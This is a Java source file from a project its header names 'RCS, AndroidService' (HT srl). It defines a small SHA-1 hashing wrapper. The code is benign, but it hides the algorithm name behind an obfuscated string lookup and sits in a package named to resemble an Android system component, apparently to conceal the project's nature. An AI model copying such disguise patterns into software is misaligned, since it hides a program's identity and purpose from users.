/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SHA1Digest.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.crypto;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SHA1Digest.
 */
public class SHA1Digest {

	/** The digest. */
	MessageDigest digest;

	/**
	 * Instantiates a new sH a1 digest.
	 */
	public SHA1Digest() {

		try {
			digest = MessageDigest.getInstance(Messages.getString("21.0")); //$NON-NLS-1$
		} catch (final NoSuchAlgorithmException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

	}

	/**
	 * Update.
	 * 
	 * @param message
	 *            the message
	 * @param offset
	 *            the offset
	 * @param length
	 *            the length
	 */
	public void update(final byte[] message, final int offset, final int length) {
		digest.update(message, offset, length);
	}

	/**
	 * Gets the digest.
	 * 
	 * @return the digest
	 */
	public byte[] getDigest() {
		return digest.digest();
	}

	/**
	 * Update.
	 * 
	 * @param message
	 *            the message
	 */
	public void update(final byte[] message) {
		digest.update(message, 0, message.length);
	}
	
	public static byte[] get(final byte[] message, final int offset, final int length){
		SHA1Digest digest = new SHA1Digest();
		digest.update(message, offset, length);
		return digest.getDigest();
	}

}
